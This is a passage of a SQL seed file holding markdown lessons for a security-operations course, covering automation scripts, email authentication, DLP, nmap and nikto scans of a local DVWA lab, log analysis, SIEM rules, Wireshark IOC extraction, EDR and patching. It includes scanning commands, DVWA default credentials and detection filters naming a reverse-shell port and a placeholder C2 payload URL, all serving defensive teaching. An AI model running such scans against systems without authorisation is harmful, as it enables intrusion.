- Read and understand basic security scripts in Python, PowerShell, and Bash.
- Describe SOAR and its role in incident response automation.

## Why Automate?

Security teams face thousands of alerts daily, manage hundreds of systems, and must respond to incidents in minutes. Manual processes cannot scale. Automation:

- **Reduces response time** — automated playbooks can contain threats in seconds.
- **Ensures consistency** — scripts execute the same steps every time.
- **Frees analysts** — routine tasks are handled automatically; analysts focus on complex decisions.
- **Improves coverage** — automated scans and checks run 24/7.

## Common Automation Use Cases

| Use Case | What It Does | Benefit |
|----------|-------------|---------|
| **Automated vulnerability scanning** | Schedule regular scans of all assets | Continuous visibility into vulnerabilities |
| **Log parsing and alerting** | Scripts parse logs for IOCs and trigger alerts | Faster detection |
| **Account management** | Auto-disable accounts inactive for 90 days | Reduces attack surface |
| **Patch deployment** | Automate patch testing and rollout | Consistent, timely patching |
| **Phishing response** | Auto-quarantine emails matching IOCs, reset affected passwords | Faster containment |
| **Firewall rule updates** | Block malicious IPs from threat feeds automatically | Real-time protection |

## Scripting for Security

### Bash Example — Check for Listening Services

```bash
#!/bin/bash
# Alert on unexpected listening ports
EXPECTED="22 80 443"
for port in $(ss -tuln | awk 'NR>1 {print $5}' | grep -oP '\d+$' | sort -u); do
    if ! echo "$EXPECTED" | grep -qw "$port"; then
        echo "ALERT: Unexpected port $port is listening"
    fi
done
```

### PowerShell Example — Find Disabled Accounts Still in Groups

```powershell
# Find disabled AD accounts that still belong to security groups
Get-ADUser -Filter {Enabled -eq $false} -Properties MemberOf |
    Where-Object { $_.MemberOf.Count -gt 0 } |
    Select-Object Name, @{N="Groups";E={$_.MemberOf -join ", "}}
```

### Python Example — Check SSL Certificate Expiry

```python
import ssl, socket, datetime

def check_cert(hostname, port=443):
    ctx = ssl.create_default_context()
    with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
        s.connect((hostname, port))
        cert = s.getpeercert()
        expires = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        days_left = (expires - datetime.datetime.utcnow()).days
        print(f"{hostname}: certificate expires in {days_left} days")
        if days_left < 30:
            print("  WARNING: Expiring soon!")

check_cert("example.com")
```

**Exam tip (Security+):** You do not need to write scripts from scratch. You need to **read** a script and understand what it does, identify the language from syntax, and recognise common security use cases.

## SOAR (Security Orchestration, Automation, and Response)

SOAR platforms (e.g. Splunk SOAR, Palo Alto XSOAR, IBM QRadar SOAR) combine:

- **Orchestration** — connect security tools (SIEM, firewall, EDR, ticketing) via APIs.
- **Automation** — playbooks automate multi-step response (e.g. "when phishing email detected: extract URLs → check threat intel → block domain → quarantine email → create ticket → notify user").
- **Response** — standardised incident response workflows.

## Key Takeaways

- Security automation reduces response time and ensures consistency.
- Know what Bash, PowerShell, and Python scripts look like and common security use cases.
- SOAR platforms orchestrate tools and automate incident response playbooks.
- Security+ SY0-701 tests scripting recognition, not writing.
$md$, 30, 2),

('b0000000-0000-4000-8000-000000000035', 'Email Security and Data Classification',
 'SPF, DKIM, DMARC, data classification levels, and data loss prevention (DLP).',
$md$
# Email Security and Data Classification

## Objectives

By the end of this lesson you will be able to:

- Explain email authentication protocols: SPF, DKIM, and DMARC.
- Describe data classification levels and their purpose.
- Explain data loss prevention (DLP) and how it protects sensitive data.
- Describe data roles: owner, custodian, processor, controller.

## Email Security

Email is the number one attack vector. Phishing, business email compromise (BEC), and malware delivery all use email. Three DNS-based protocols authenticate email senders:

### SPF (Sender Policy Framework)

A DNS TXT record that lists which mail servers are authorised to send email for a domain.

```
v=spf1 include:_spf.google.com ip4:203.0.113.5 -all
```

- `include:_spf.google.com` — Google's servers are authorised.
- `ip4:203.0.113.5` — this IP is authorised.
- `-all` — reject all others (hard fail). `~all` = soft fail (accept but mark).

### DKIM (DomainKeys Identified Mail)

The sending server signs outgoing emails with a private key. The receiving server verifies the signature using the sender's public key (published as a DNS TXT record). This proves the email was not modified in transit and really came from that domain.

### DMARC (Domain-based Message Authentication, Reporting, and Conformance)

DMARC tells receiving servers what to do when SPF or DKIM fails:

```
v=DMARC1; p=reject; rua=mailto:dmarc-reports@example.com
```

- `p=none` — monitor only (no action).
- `p=quarantine` — send to spam folder.
- `p=reject` — reject the email entirely.
- `rua=` — send aggregate reports to this address.

**Together:** SPF validates the sending server, DKIM validates the message integrity, and DMARC provides policy and reporting.

## Data Classification

Data classification categorises information by sensitivity to determine appropriate handling and protection.

### Common Classification Levels

| Level | Description | Examples | Handling |
|-------|-------------|----------|----------|
| **Public** | No harm if disclosed | Marketing materials, press releases | No restrictions |
| **Internal** | Minor impact if disclosed | Internal policies, org charts | Share within the organisation only |
| **Confidential** | Significant impact if disclosed | Customer data, financial reports, contracts | Encryption, access controls, need-to-know |
| **Restricted / Secret** | Severe impact if disclosed | Trade secrets, PII/PHI, cryptographic keys | Strong encryption, strict access controls, audit logging |

Government classification: Unclassified → Confidential → Secret → Top Secret.

### Data Roles

| Role | Responsibility |
|------|---------------|
| **Data owner** | Senior leader who decides classification, access policies, and acceptable use |
| **Data custodian** | IT staff who implement and maintain security controls (backups, encryption, access) |
| **Data controller** | (GDPR term) Determines the purposes and means of processing personal data |
| **Data processor** | (GDPR term) Processes data on behalf of the controller |
| **Data steward** | Ensures data quality, accuracy, and compliance with policies |

## Data Loss Prevention (DLP)

DLP systems monitor, detect, and prevent unauthorised transmission of sensitive data.

### DLP Deployment Points

| Location | What It Monitors |
|----------|-----------------|
| **Network DLP** | Email, web traffic, file transfers leaving the network |
| **Endpoint DLP** | USB drives, printing, copy/paste, screen capture on user devices |
| **Cloud DLP** | SaaS applications, cloud storage uploads |

### How DLP Works

1. **Define policies** — e.g. "Block any email containing more than 10 credit card numbers."
2. **Content inspection** — DLP scans content using pattern matching (regex for card numbers, SSNs), keyword matching, and document fingerprinting.
3. **Action** — block, quarantine, encrypt, alert, or log.

## Key Takeaways

- SPF + DKIM + DMARC together authenticate email and prevent spoofing.
- Data classification drives handling requirements — know the four levels.
- Data owners decide policy; custodians implement controls.
- DLP monitors data in motion (network), at rest (endpoint), and in the cloud.
$md$, 30, 3),

('b0000000-0000-4000-8000-000000000035', 'Vulnerability Scanning Tools: nmap, nikto, and Docker',
 'Hands-on introduction to vulnerability scanning tools used in the capstone project.',
$md$
# Vulnerability Scanning Tools: nmap, nikto, and Docker

## Objectives

By the end of this lesson you will be able to:

- Deploy DVWA (Damn Vulnerable Web Application) using Docker on Kali Linux.
- Use nmap NSE scripts for vulnerability detection.
- Use nikto to scan web servers for misconfigurations and vulnerabilities.
- Interpret scan results and understand false positives.

## Docker Basics

Docker runs applications in isolated containers. A container is like a lightweight virtual machine that shares the host's kernel.

### Key Commands

```
sudo docker pull [image]        # Download an image
sudo docker run -d -p 80:80 [image]  # Run container in background, map port 80
sudo docker ps                  # List running containers
sudo docker stop [container_id] # Stop a container
```

### Setting Up DVWA

DVWA is a deliberately vulnerable web application designed for security testing practice.

```
sudo docker run -d -p 80:80 vulnerables/web-dvwa
```

This downloads and starts DVWA on http://localhost. Default login: `admin` / `password`. After logging in, click "Create / Reset Database" to initialise.

**Important:** DVWA runs only on your local machine. You are attacking your own system — this is legal and ethical.

## nmap NSE Vulnerability Scripts

nmap's Nmap Scripting Engine (NSE) includes scripts for vulnerability detection.

### Vulnerability Scan

```
nmap --script vuln localhost
```

This runs all scripts in the "vuln" category against the target. Output might include:

- CVE identifiers for known vulnerabilities.
- SSL/TLS weaknesses.
- HTTP vulnerabilities (directory listing, clickjacking).

### Specific Script Categories

```
nmap --script "http-*" localhost      # All HTTP scripts
nmap --script ssl-enum-ciphers localhost  # Check TLS cipher suites
```

### Reading NSE Output

Each finding includes the script name and details:

```
| http-csrf:
|   Spidering limited to: maxdepth=3; maxpagecount=20
|   Found the following possible CSRF vulnerabilities:
|     Path: http://localhost/vulnerabilities/csrf/
|       Form id: 
|       Form action: #
```

Not every finding is a confirmed vulnerability — NSE scripts may produce **false positives**. Always verify findings manually.

## nikto — Web Server Scanner

nikto scans web servers for thousands of known issues: outdated software, dangerous files, misconfigurations, and missing security headers.

### Basic Scan

```
nikto -h http://localhost
```

### Output to File

```
nikto -h http://localhost -o scan_results.txt
```

### Reading nikto Output

```
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ /config/: Directory indexing found.
+ OSVDB-3268: /docs/: Directory indexing found.
+ /login.php: Admin login page/section found.
```

Each line starting with `+` is a finding. Some are informational, some are security issues. Key things to look for:

- **Missing security headers** (X-Frame-Options, X-Content-Type-Options, CSP).
- **Directory indexing** — server lists directory contents (information disclosure).
- **Default/admin pages** exposed.
- **Outdated server versions** with known CVEs.

## Understanding False Positives

Automated scanners report anything that **might** be an issue. Not everything is exploitable. A false positive is a finding that looks like a vulnerability but is not actually a risk in context. Always:

1. **Verify** — can you actually exploit the finding?
2. **Assess context** — is the "vulnerable" component exposed to attackers?
3. **Check versions** — is the reported CVE actually applicable to this specific version?
4. **Document** — record false positives so they are not re-investigated.

## Key Takeaways

- Docker lets you deploy vulnerable targets (DVWA) safely on your own machine.
- `nmap --script vuln` runs NSE vulnerability scripts — useful but may produce false positives.
- nikto scans web servers for misconfigurations, outdated software, and missing headers.
- Always verify automated findings — not every scanner result is a real vulnerability.
$md$, 30, 4);

-- ========== BH-OPS-2: Module 3 — Security Monitoring and Analysis ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000043', 'Log Analysis Techniques',
 'Windows Event Logs, Sysmon, firewall logs, and proxy logs for SOC analysts.',
$md$
# Log Analysis Techniques

## Objectives

By the end of this lesson you will be able to:

- Identify the key Windows Event Log sources and critical Event IDs.
- Describe Sysmon and its value for detection.
- Analyse firewall and proxy log entries.
- Correlate events across multiple log sources.

## Windows Event Logs

Windows generates events in several log channels. The three most important for security:

### Security Log — Key Event IDs

| Event ID | Description | Why It Matters |
|----------|-------------|---------------|
| **4624** | Successful logon | Track who logged in, when, and from where |
| **4625** | Failed logon | Detect brute-force attacks (many 4625s followed by 4624) |
| **4648** | Logon with explicit credentials | Pass-the-hash, runas, lateral movement |
| **4672** | Special privileges assigned | Admin logon — monitor for unexpected admin activity |
| **4688** | New process created | See what programmes are being run (requires audit policy) |
| **4720** | User account created | Detect unauthorised account creation |
| **4732** | Member added to security group | Privilege escalation (e.g. added to Domain Admins) |
| **7045** | Service installed | Malware often installs itself as a service |

### Sysmon (System Monitor)

Sysmon is a free Microsoft tool that provides detailed logging far beyond default Windows events:

| Sysmon Event ID | Description | Detection Use |
|-----------------|-------------|---------------|
| **1** | Process creation (with full command line, hash, parent process) | Detect malicious processes |
| **3** | Network connection | Detect C2 (command and control) communication |
| **7** | Image loaded (DLL) | Detect DLL injection |
| **11** | File creation | Detect malware dropping files |
| **13** | Registry modification | Detect persistence mechanisms |
| **22** | DNS query | Detect DNS-based C2 or data exfiltration |

Sysmon must be installed and configured separately — it is not enabled by default.

## Firewall and Proxy Logs

### Firewall Logs

Firewall logs show allowed and denied connections. Key fields: timestamp, source IP, destination IP, port, protocol, action (allow/deny).

Look for:
- **Denied outbound** to unusual ports (potential malware trying to phone home).
- **Allowed inbound** to unexpected services (misconfigured rules).
- **High volume** from a single source (scanning or DDoS).

### Proxy Logs

Web proxy logs show HTTP/HTTPS requests. Key fields: timestamp, source IP, URL, user agent, response code, bytes transferred.

Look for:
- Connections to **newly registered domains** or **known malicious URLs**.
- **Unusual user agents** (malware often uses distinctive strings).
- **Large uploads** to cloud storage or file-sharing sites (data exfiltration).
- Access during **off-hours** from user accounts.

## Log Correlation

Correlation combines events from multiple sources to build a picture:

**Example — Detecting Lateral Movement:**
1. Firewall log: connection from workstation A to server B on port 445 (SMB).
2. Security log on server B: Event 4624 (logon) from workstation A, logon type 3 (network).
3. Security log on server B: Event 4672 (admin privileges assigned).
4. Sysmon on server B: Event 1 (process creation) — `cmd.exe` launched by the logged-in user.

Any single event looks normal. Together, they tell a story: someone on workstation A logged into server B with admin credentials and ran commands.

## Key Takeaways

- Know the critical Windows Event IDs: 4624, 4625, 4648, 4672, 4688, 4720, 4732, 7045.
- Sysmon provides process, network, and file activity that default Windows logging misses.
- Firewall logs show network allow/deny; proxy logs show web requests.
- Correlation across multiple log sources is how analysts detect complex attacks.
$md$, 35, 1),

('b0000000-0000-4000-8000-000000000043', 'SIEM Correlation and Use Cases',
 'SIEM architecture, correlation rules, use case development, and alert tuning.',
$md$
# SIEM Correlation and Use Cases

## Objectives

By the end of this lesson you will be able to:

- Describe SIEM architecture and how logs flow into the system.
- Explain correlation rules and how they detect threats.
- Design basic SIEM use cases for common attack patterns.
- Describe alert tuning to reduce false positives.

## SIEM Architecture

A Security Information and Event Management (SIEM) system collects, normalises, correlates, and stores security events from across the environment.

### Data Flow

1. **Collection** — agents or syslog forward logs from endpoints, servers, firewalls, proxies, cloud services, and applications.
2. **Parsing and normalisation** — raw logs are parsed into structured fields (timestamp, source, destination, action, user). Different log formats are normalised to a common schema.
3. **Enrichment** — events are enriched with context: threat intelligence (is this IP known-bad?), asset data (is this a critical server?), user data (is this an admin?).
4. **Correlation** — rules and algorithms compare events to detect patterns that indicate threats.
5. **Alerting** — matched rules generate alerts for analyst review.
6. **Storage and search** — all events are indexed for investigation and compliance.

## Correlation Rules

A correlation rule defines a pattern of events that indicates a threat. Types:

| Rule Type | Description | Example |
|-----------|-------------|---------|
| **Single event** | One event triggers the alert | "Alert on any Event 4720 (account created) outside business hours" |
| **Threshold** | Count of events exceeds a limit in a time window | "More than 10 failed logins (4625) in 5 minutes from one source" |
| **Sequence** | Events occur in a specific order | "Failed logins followed by successful login followed by new process creation" |
| **Aggregation** | Group events and trigger when a condition is met | "More than 5 unique hosts contacted by one source in 10 minutes (potential scanning)" |
| **Absence** | Expected event does NOT occur | "No heartbeat from critical server for 15 minutes" |

## Designing Use Cases

A SIEM use case documents: what threat it detects, what data sources are needed, the correlation logic, and the response procedure.

**Example Use Case — Brute Force Detection:**

| Field | Value |
|-------|-------|
| **Threat** | Credential brute-force attack |
| **Data source** | Windows Security Log, VPN logs |
| **Logic** | More than 20 Event 4625 (failed logon) from a single source IP within 10 minutes, followed by Event 4624 (successful logon) from the same IP within 30 minutes |
| **Alert priority** | High (if successful logon follows); Medium (if only failures) |
| **Response** | Investigate source IP, check if account is compromised, consider blocking IP |

## Alert Tuning

Raw SIEM rules produce many false positives. Tuning reduces noise:

- **Whitelisting** — exclude known-good activity (e.g. exclude the vulnerability scanner's IP from brute-force rules).
- **Threshold adjustment** — increase the threshold if too many alerts (e.g. from 5 to 20 failures).
- **Time-based tuning** — suppress alerts during scheduled maintenance windows.
- **Context enrichment** — only alert if the target is a critical asset or the user is an admin.

The goal is not zero false positives — it is an acceptable ratio where analysts can investigate every alert efficiently.

## Key Takeaways

- SIEMs collect, normalise, correlate, and alert on security events from across the environment.
- Correlation rules match patterns: single events, thresholds, sequences, aggregations, and absences.
- Good use cases specify the threat, data sources, logic, priority, and response.
- Alert tuning (whitelisting, threshold adjustment, context enrichment) is essential to reduce noise.
$md$, 30, 2),

('b0000000-0000-4000-8000-000000000043', 'Network Traffic Analysis',
 'NetFlow, packet capture as a SOC activity, and baseline deviation detection.',
$md$
# Network Traffic Analysis

## Objectives

By the end of this lesson you will be able to:

- Describe NetFlow and its use in network monitoring.
- Explain how packet capture supports SOC investigations.
- Identify baseline deviations that indicate threats.
- Describe common network-based indicators of compromise.

## NetFlow

NetFlow (and its equivalents — sFlow, IPFIX) records metadata about network conversations without capturing full packet content.

A flow record typically includes: source IP, destination IP, source port, destination port, protocol, byte count, packet count, timestamps, and TCP flags.

### NetFlow vs Full Packet Capture

| | NetFlow | Full Packet Capture |
|-|---------|-------------------|
| **Data volume** | Small (metadata only) | Very large (all content) |
| **Storage** | Weeks to months | Hours to days |
| **Visibility** | Who talked to whom, how much, when | Full content of communications |
| **Use case** | Trend analysis, anomaly detection, forensic scoping | Deep investigation, malware analysis, evidence |
| **Privacy** | Less intrusive | Captures sensitive content |

### What NetFlow Reveals

- **Data exfiltration** — unusually large outbound transfers to unfamiliar destinations.
- **Lateral movement** — internal host-to-host communication on unexpected ports.
- **C2 beaconing** — regular, periodic connections to an external IP (e.g. every 60 seconds).
- **Scanning** — one host connecting to many hosts on the same port in rapid succession.

## Baseline Deviations

A baseline represents normal network behaviour. Deviations from the baseline are potential indicators:

| Baseline Metric | Normal | Anomaly | Possible Threat |
|----------------|--------|---------|----------------|
| Outbound traffic volume | 5 GB/day | 50 GB in 2 hours | Data exfiltration |
| DNS query rate | 200/hour | 10,000/hour | DNS tunnelling |
| Connections to new external IPs | 50/day | 500/day | Malware C2 |
| Internal traffic patterns | Mostly client→server | Server→server spike | Lateral movement |

## Network-Based Indicators of Compromise

| Indicator | Description | Detection Method |
|-----------|-------------|-----------------|
| **Beaconing** | Regular, periodic outbound connections (e.g. every 60s or with jitter) | NetFlow analysis, time-series analysis |
| **DNS tunnelling** | Data encoded in DNS queries to exfiltrate data or receive commands | High DNS query volume, long/random-looking subdomains |
| **Known-bad IPs/domains** | Communication with threat-intelligence-flagged destinations | SIEM enrichment with threat feeds |
| **Protocol anomalies** | Unexpected protocols on standard ports (e.g. non-HTTP on port 80) | Deep packet inspection, protocol analysis |
| **Certificate anomalies** | Self-signed certificates, mismatched CN, expired certs on TLS connections | TLS inspection, certificate monitoring |

## Key Takeaways

- NetFlow records who talked to whom and how much — without capturing content.
- Full packet capture is needed for deep investigation but generates massive data volumes.
- Baseline deviations (volume, frequency, destinations) are primary indicators of compromise.
- C2 beaconing, DNS tunnelling, and lateral movement are detectable through network analysis.
$md$, 30, 3),

('b0000000-0000-4000-8000-000000000043', 'Packet Forensics with Wireshark',
 'Using Wireshark for incident investigation, stream analysis, and IOC extraction.',
$md$
# Packet Forensics with Wireshark

## Objectives

By the end of this lesson you will be able to:

- Open and navigate PCAP files in Wireshark.
- Use Statistics views to build situational awareness.
- Apply display filters to isolate suspicious traffic.
- Follow TCP streams to reconstruct communications.
- Extract indicators of compromise (IOCs) from packet data.

## Forensic Analysis Workflow

When investigating a network incident with a PCAP file, follow this workflow:

### Step 1 — Situational Awareness

Open the PCAP and check:
- **Statistics → Capture File Properties** — total packets, time span, average packets per second.
- **Statistics → Protocol Hierarchy** — what protocols are present? Is there unexpected traffic (e.g. IRC, Telnet, or unusual protocols)?
- **Statistics → Endpoints (IPv4)** — how many unique hosts? Sort by packets or bytes to find the most active.
- **Statistics → Conversations (TCP)** — which pairs communicated most? Large transfers may indicate exfiltration.

### Step 2 — Filter and Focus

Apply display filters to zoom in:

```
http.request                          # HTTP requests
dns.qry.name contains "suspicious"    # DNS queries for specific domains
tcp.port == 4444                      # Common Metasploit reverse shell port
ip.addr == 10.0.0.5 && http           # HTTP traffic from/to specific host
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN packets only (connection attempts)
```

### Step 3 — Reconstruct Conversations

Right-click a packet of interest → **Follow → TCP Stream**. This shows the full conversation in readable text. For HTTP traffic, you will see:
- The request (method, URL, headers, body).
- The response (status code, headers, body).

Look for: credentials in cleartext, commands executed, files transferred, user-agent strings.

### Step 4 — Extract IOCs

From your analysis, document:

| IOC Type | Example | Where Found |
|----------|---------|-------------|
| **IP address** | 203.0.113.42 | Endpoint statistics, conversation view |
| **Domain** | evil-c2.example.com | DNS queries (`dns.qry.name`) |
| **URL** | http://evil-c2.example.com/payload.exe | HTTP requests |
| **User-Agent** | Mozilla/4.0 (compatible; MSIE 6.0) | HTTP request headers (outdated = suspicious) |
| **File hash** | (export file from PCAP, then hash it) | File → Export Objects → HTTP |
| **Port** | 4444 (reverse shell) | Conversation view, filter |

### Step 5 — Timeline

Build a timeline from packet timestamps:
1. First suspicious DNS query → attacker establishing C2.
2. HTTP POST with encoded data → data exfiltration.
3. Connection to internal host on port 445 → lateral movement.

## Exporting Objects

**File → Export Objects → HTTP** shows all files transferred over HTTP in the capture. You can save them for malware analysis. **Caution:** exported files may be actual malware — handle in an isolated environment.

## Key Takeaways

- Start with Statistics views to understand the capture before filtering.
- Display filters are essential — know http.request, dns.qry.name, ip.addr, tcp.port.
- Follow TCP Stream reconstructs full conversations for analysis.
- Extract and document IOCs: IPs, domains, URLs, user agents, file hashes.
- Build a timeline from packet timestamps to understand the attack sequence.
$md$, 35, 4);

-- ========== BH-OPS-2: Module 4 — Vulnerability and Endpoint Management ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000044', 'Vulnerability Scanning in Depth',
 'Scanner types, scan policies, credentialed vs uncredentialed, and remediation tracking.',
$md$
# Vulnerability Scanning in Depth

## Objectives

By the end of this lesson you will be able to:

- Distinguish vulnerability scanners from penetration testing.
- Describe credentialed vs uncredentialed scans and when to use each.
- Explain scan policies, scheduling, and scope.
- Describe vulnerability remediation tracking and exception management.

## Vulnerability Assessment vs Penetration Testing

| | Vulnerability Assessment | Penetration Test |
|-|------------------------|-----------------|
| **Goal** | Identify vulnerabilities | Exploit vulnerabilities to prove impact |
| **Scope** | Broad (all systems) | Focused (specific targets) |
| **Frequency** | Regular (weekly/monthly) | Periodic (annual/after major changes) |
| **Automation** | Highly automated | Mostly manual with some automation |
| **Risk** | Low (non-intrusive) | Higher (exploitation may cause disruption) |
| **Output** | List of vulnerabilities with severity | Report demonstrating real impact |

## Scanner Types

| Scanner | Focus |
|---------|-------|
| **Network vulnerability scanner** (e.g. Nessus, Qualys, OpenVAS) | Scan hosts for missing patches, misconfigurations, known CVEs |
| **Web application scanner** (e.g. Burp Suite, OWASP ZAP, nikto) | Scan web applications for SQLi, XSS, misconfigurations |
| **Cloud security posture management (CSPM)** | Scan cloud configurations for security issues |
| **Container scanner** (e.g. Trivy, Snyk) | Scan container images for vulnerable packages |

## Credentialed vs Uncredentialed Scans

| | Credentialed | Uncredentialed |
|-|-------------|----------------|
| **Access** | Scanner logs in to the target (SSH, WMI, SNMP) | Scanner only checks from the network |
| **Depth** | Deep — can check installed software versions, registry settings, file permissions | Surface — only sees what is network-exposed |
| **Accuracy** | Higher — fewer false positives and false negatives | Lower — may miss internal vulnerabilities |
| **Use case** | Regular compliance and patch verification | External-facing assessment, initial discovery |

**Best practice:** Run credentialed scans internally on a regular schedule. Run uncredentialed scans against your external perimeter.

## Scan Policies and Scheduling

A **scan policy** defines: which checks to run (all, only critical, compliance-specific), intensity (how aggressively to probe), and exclusions (fragile systems, medical devices).

Scheduling:
- **Weekly** or **monthly** for routine scans.
- **After changes** — new deployments, patches, configuration changes.
- **Maintenance windows** — scan during off-hours to minimise impact.
- **Continuous** — some organisations run rolling scans that cover all assets over a period.

## Remediation Tracking

Scanning without remediation is pointless. A mature programme tracks:

| Metric | Description |
|--------|-------------|
| **Mean time to remediate (MTTR)** | Average time from discovery to fix |
| **SLA by severity** | Critical: 7 days, High: 30 days, Medium: 90 days, Low: next cycle |
| **Exception/waiver** | Documented risk acceptance when a vulnerability cannot be fixed (e.g. legacy system) |
| **Recurrence rate** | How often the same vulnerability reappears (indicates process failure) |

## Key Takeaways

- Vulnerability scanning is automated and broad; penetration testing is manual and focused.
- Credentialed scans find more issues than uncredentialed scans.
- Scan policies control what is tested and how aggressively.
- Remediation tracking with SLAs ensures vulnerabilities are actually fixed.
$md$, 30, 1),

('b0000000-0000-4000-8000-000000000044', 'Endpoint Detection and Response',
 'EDR concepts, behavioural detection, process monitoring, and response actions.',
$md$
# Endpoint Detection and Response

## Objectives

By the end of this lesson you will be able to:

- Describe what EDR is and how it differs from traditional antivirus.
- Explain behavioural detection and its advantages.
- Describe common EDR response actions.
- Identify key endpoint telemetry for threat detection.

## EDR vs Traditional Antivirus

| | Traditional Antivirus | EDR |
|-|----------------------|-----|
| **Detection method** | Signature-based (known malware signatures) | Behavioural + signatures + ML |
| **Visibility** | File scanning only | Process activity, network connections, file changes, registry modifications |
| **Response** | Block/quarantine file | Isolate host, kill process, collect forensic data, rollback changes |
| **Investigation** | Limited | Full timeline of endpoint activity |
| **Scope** | Individual endpoint | Centrally managed across all endpoints |

EDR agents collect rich telemetry from endpoints and send it to a central console. Analysts can search across all endpoints for indicators of compromise.

## Behavioural Detection

Instead of looking for known malware signatures, behavioural detection watches for suspicious **behaviour**:

| Behaviour | Why It Is Suspicious |
|-----------|---------------------|
| PowerShell executing encoded commands | Common malware technique to evade detection |
| Word document spawning cmd.exe | Macro-based malware |
| Process injecting into another process | DLL injection, process hollowing |
| Unusual outbound connection from a server | Potential C2 communication |
| New service installed outside change window | Persistence mechanism |
| Credential dumping tools (e.g. mimikatz signatures) | Credential theft |

## EDR Response Actions

When a threat is detected, analysts can:

| Action | Description |
|--------|-------------|
| **Isolate host** | Cut network access while maintaining management connection to EDR |
| **Kill process** | Terminate the malicious process |
| **Quarantine file** | Move the malicious file to a secure container |
| **Collect forensic package** | Grab memory dump, event logs, and process list for analysis |
| **Rollback** | Some EDR tools can reverse changes made by ransomware |
| **Block hash** | Prevent the file from executing on any endpoint |

## Key Takeaways

- EDR provides visibility into endpoint behaviour far beyond what antivirus offers.
- Behavioural detection catches threats that signature-based tools miss.
- Response actions (isolate, kill, quarantine, collect) let analysts contain threats remotely.
- EDR telemetry (processes, connections, file changes) is essential for investigation.
$md$, 25, 2),

('b0000000-0000-4000-8000-000000000044', 'Patch Management and Configuration Compliance',
 'Patch lifecycle, CIS benchmarks, configuration baselines, and compliance scanning.',
$md$
# Patch Management and Configuration Compliance

## Objectives

By the end of this lesson you will be able to:

- Describe the patch management lifecycle.
- Explain CIS Benchmarks and security baselines.
- Describe configuration compliance scanning.
- Identify patch management challenges and best practices.

## Patch Management Lifecycle

1. **Inventory** — maintain an accurate asset inventory. You cannot patch what you do not know about.
2. **Monitor** — track vendor advisories, CVEs, and security bulletins for your software and OS versions.
3. **Assess** — evaluate each patch: severity, exploitability, affected systems, business impact.
4. **Test** — apply the patch in a test environment to check for compatibility issues.
5. **Deploy** — roll out to production, often in waves (pilot group first, then broader).
6. **Verify** — confirm patches applied successfully (scan or check version numbers).
7. **Document** — record what was patched, when, and any issues encountered.

### Patch Priority

| Severity | Example | SLA |
|----------|---------|-----|
| **Critical** | Remote code execution, actively exploited | 48–72 hours |
| **High** | Privilege escalation, significant impact | 7–14 days |
| **Medium** | Information disclosure, limited impact | 30 days |
| **Low** | Minor bugs, defence-in-depth improvements | Next maintenance cycle |

## CIS Benchmarks

The **Center for Internet Security (CIS)** publishes free, consensus-based configuration guidelines for operating systems, cloud services, databases, and applications.

A CIS Benchmark specifies hundreds of configuration settings. Examples for Windows Server:

| Setting | CIS Recommendation | Rationale |
|---------|-------------------|-----------|
| Account lockout threshold | 5 invalid attempts | Prevents brute force |
| Minimum password length | 14 characters | Strengthens passwords |
| Audit logon events | Success and Failure | Enables detection |
| Remote Desktop | Disable if not needed | Reduces attack surface |

CIS also publishes **CIS Controls** — a prioritised set of 18 security actions (e.g. inventory hardware, inventory software, configure securely, control admin privileges).

## Configuration Compliance Scanning

Tools like **Nessus**, **Qualys**, and **SCAP-compliant scanners** can check systems against CIS Benchmarks or DISA STIGs (Security Technical Implementation Guides) and report deviations.

Output: a compliance score (e.g. 85% compliant) with specific failed checks and remediation guidance.

## Key Takeaways

- Patch management is a lifecycle: inventory → monitor → assess → test → deploy → verify → document.
- CIS Benchmarks provide specific, tested configuration recommendations.
- Configuration compliance scanning automates the verification of security baselines.
- Patching critical vulnerabilities within 48–72 hours is industry best practice.
$md$, 25, 3),

('b0000000-0000-4000-8000-000000000044', 'Access Controls for Security Operations',
 'Access control models, AAA, 802.1X, and NAC in an operational context.',
$md$
# Access Controls for Security Operations

## Objectives

By the end of this lesson you will be able to:

- Describe access control models (DAC, MAC, RBAC, ABAC) in an operational context.
- Explain AAA (Authentication, Authorization, Accounting) and its protocols.
- Describe 802.1X and Network Access Control (NAC).
- Identify access control weaknesses that SOC analysts should monitor.

## Access Control Models Review

| Model | Description | Example |
|-------|-------------|---------|
| **DAC** (Discretionary) | Owner controls access | File owner sets read/write permissions |
| **MAC** (Mandatory) | System enforces access based on labels | Military: Top Secret document can only be read by Top Secret-cleared users |
| **RBAC** (Role-Based) | Access based on job role | "Finance Analyst" role can view invoices but not approve payments |
| **ABAC** (Attribute-Based) | Access based on attributes (user, resource, environment) | "Allow if user.department=Finance AND resource.classification=Internal AND time=BusinessHours" |

## AAA — Authentication, Authorization, Accounting

| Component | Question | Example |
|-----------|----------|---------|
| **Authentication** | Who are you? | Username + password + MFA token |
| **Authorization** | What can you do? | Role-based permissions, group memberships |
| **Accounting** | What did you do? | Audit logs, session logs, command logs |

### AAA Protocols

| Protocol | Use Case | Notes |
|----------|----------|-------|
| **RADIUS** | Network access (Wi-Fi, VPN) | UDP-based, encrypts only the password |
| **TACACS+** | Network device administration (routers, switches) | TCP-based, encrypts the entire session |
| **Kerberos** | Enterprise authentication (Active Directory) | Ticket-based, SSO within a domain |

## 802.1X — Port-Based Network Access Control

802.1X requires devices to authenticate before gaining network access. Components:

- **Supplicant** — the device requesting access (e.g. laptop with 802.1X client).
- **Authenticator** — the switch or wireless access point that controls the port.
- **Authentication server** — RADIUS server that verifies credentials.

Flow: Device connects → port is blocked → device sends credentials → switch forwards to RADIUS → RADIUS approves/denies → port is opened/remains blocked.

**EAP (Extensible Authentication Protocol)** is the framework used within 802.1X. Common types: EAP-TLS (certificate-based, most secure), PEAP (password-based with TLS tunnel), EAP-FAST.

## NAC (Network Access Control)

NAC goes beyond 802.1X by also checking the **health** of the device:

- Is the OS patched?
- Is antivirus installed and up to date?
- Is the firewall enabled?
- Is the device managed (domain-joined)?

Devices that fail health checks can be placed in a **quarantine VLAN** with limited access until they are remediated.

## What SOC Analysts Should Monitor

| Indicator | Why |
|-----------|-----|
